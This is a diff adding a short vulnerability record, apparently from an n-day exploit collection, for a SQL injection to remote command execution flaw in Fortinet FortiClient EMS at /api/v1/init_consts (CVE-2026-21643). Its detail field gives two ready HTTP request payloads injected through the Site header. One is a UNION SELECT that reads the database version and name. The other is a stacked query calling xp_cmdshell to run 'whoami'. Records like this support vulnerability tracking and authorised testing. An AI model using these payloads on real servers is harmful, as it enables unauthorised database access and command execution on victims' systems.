@@ -1,0 +1,13 @@
+vendor = "fortinet"
+name = "Fortinet FortiClient EMS SQL注入远程命令执行漏洞"
+type = "SQL注入"
+path = "/api/v1/init_consts"
+version = "7.4.5"
+detail = """GET /api/v1/init_consts HTTP/1.1 Host: target Site: ' UNION SELECT 1,@@version,db_name()--
+
+GET /api/v1/init_consts HTTP/1.1 Host: target Site: '; EXEC xp_cmdshell('whoami')--"""
+fix = "升级至 7.4.5+"
+date = 20260206
+label = "nday"
+cve = "CVE-2026-21643"
+verifier = "AdySec"
